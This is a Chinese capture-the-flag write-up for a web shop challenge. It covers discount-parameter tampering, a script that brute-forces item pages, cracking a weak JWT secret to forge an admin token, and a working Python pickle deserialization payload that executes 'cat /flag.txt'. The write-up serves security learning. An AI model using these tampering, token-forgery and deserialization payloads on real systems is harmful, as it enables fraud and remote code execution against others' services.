登陆看到

![图片](https://github.com/user-attachments/assets/7f093c34-b7f9-4664-9080-aaeda7b5f736)

然后去购买界面
因为有提示薅羊毛与逻辑漏洞
所以就是逻辑漏洞试一下

经过fuzz 只有优惠卷能改

![图片](https://github.com/user-attachments/assets/292a7a0a-4731-4c9d-aacd-ab52b31cdf0e)

改成0.1就是一折
但是这个点满怎么点呢？

![图片](https://github.com/user-attachments/assets/6fe01dc5-a4bb-4e61-8c95-c9ed25a0bcc0)


![图片](https://github.com/user-attachments/assets/ba8b7c46-ff81-4990-9666-5b710fd77165)
看到是info/4
这个是什么?EKanEhgLeJTKhBdqMwevWIenptkDoUPlQxvXesLuUkeQbuPWwAPaDMZoRdHFbSTpaHzDxCrhXgORrIYWUDcGvQDCjyEJsywuhsBA
先不管
写脚本跑出v6
```import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor


b_url = "http://61.147.171.105:53808/info/"


def check_page(i):
    url = f"{b_url}{i}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            if soup.find('img', src="/static/img/lv/lv6.png"):
                print(f"Found lv6.png at: {url}")
    except requests.RequestException as e:
        print(f"Error fetching {url}: {e}")


def main():
    with ThreadPoolExecutor(max_workers=50) as executor:  
        executor.map(check_page, range(1, 10001))

if __name__ == "__main__":
    main()
```

![图片](https://github.com/user-attachments/assets/7f698e04-dd82-4de8-aa4f-4bbff2a2b055)

在Found lv6.png at: http://61.147.171.105:53808/info/1624

![图片](https://github.com/user-attachments/assets/5c7b59b9-aedd-46fa-891d-f4833395361c)

Price: 1145141919.0

hint:I'm flag man
价格有一点点高
改一下打折
提示操作失败买都买不了

在包里我们一直能看到一个jwt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0In0.shtaGFY4ElUWy2uZcrkuiNmRozCQcF8J96Z9zE573V8

![图片](https://github.com/user-attachments/assets/f0448c34-54cf-443e-be3a-e9e4ee85900c)
改成admin
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.U9kFejeDXwxz1jiRFypKoFCb5Sor_CWe-_gr-uqFwtE
发现伪造的不通？？？
跑一下密钥 ....是几把这个
1Kun
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo

然后买还是没反应 看个人中心是不是admin

![图片](https://github.com/user-attachments/assets/11617c2f-54a6-4742-ba31-5949aa456b0c)

![图片](https://github.com/user-attachments/assets/0d8e92a9-4af1-4a52-b7bc-c391a67225b0)
后门？
不是
![图片](https://github.com/user-attachments/assets/719b19a5-fc45-4b56-8448-fccf103d3a19)
v6啥也没有啊
我尝试加jwt再次爆破路径发现还是1246那个lv6

所以我走了一遍流程发现在购物车直接结账
改这个id=1624&price=1145141919.0&discount=0.000000001
说不定能结走

然后我就发现了/b1g_m4mber

![图片](https://github.com/user-attachments/assets/6788af58-f4a1-4b1d-9fe9-91d32e4c7a96)

然后我们拿管理员

![图片](https://github.com/user-attachments/assets/f4956a97-0e88-4a3f-94e3-616a32f473b2)
![图片](https://github.com/user-attachments/assets/b39d6539-b169-45be-a344-f4f17e322388)
![图片](https://github.com/user-attachments/assets/c9032795-6eb9-4ebc-9e0d-d2c1a145ad35)
果然后面在这 有一个源码

下载是.py 我直接警觉原型链污染

好吧是反序列化pickle.loads
![图片](https://github.com/user-attachments/assets/55cb2a64-f516-4329-aba2-bf2e37eed493)
 p = pickle.loads(urllib.unquote(become))
 
Pickle 反序列化漏洞
Ref. https://xz.aliyun.com/t/14061?time__1311=GqAxuDRD0iwxlEzG7Dy7YDkKYnjxWTKpD

这里位置是
become = self.get_argument('become')
p = pickle.loads(urllib.unquote(become))
become 然后url解码

            
因为库的问题卡了我好久py3的subprocess库转出来的payload不对
```import pickle
import urllib
import commands  # Python 2 only

class payload(object):
    def __reduce__(self):
        #ls /
        return (commands.getoutput, ("cat /flag.txt",))  # Using commands.getoutput to execute the command

a = pickle.dumps(payload())
a = urllib.quote(a)  # In Python 2, use urllib.quote
print(a)
```
#ccommands%0Agetoutput%0Ap0%0A%28S%27cat%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.
![图片](https://github.com/user-attachments/assets/89cb2931-76ae-40c8-affa-62d4e963c950)

# flag{dfe54e6fe1e34f1e8fb03c8b50e963bd}
![图片](https://github.com/user-attachments/assets/729aa913-f82c-4613-9197-ea30e4fad373)
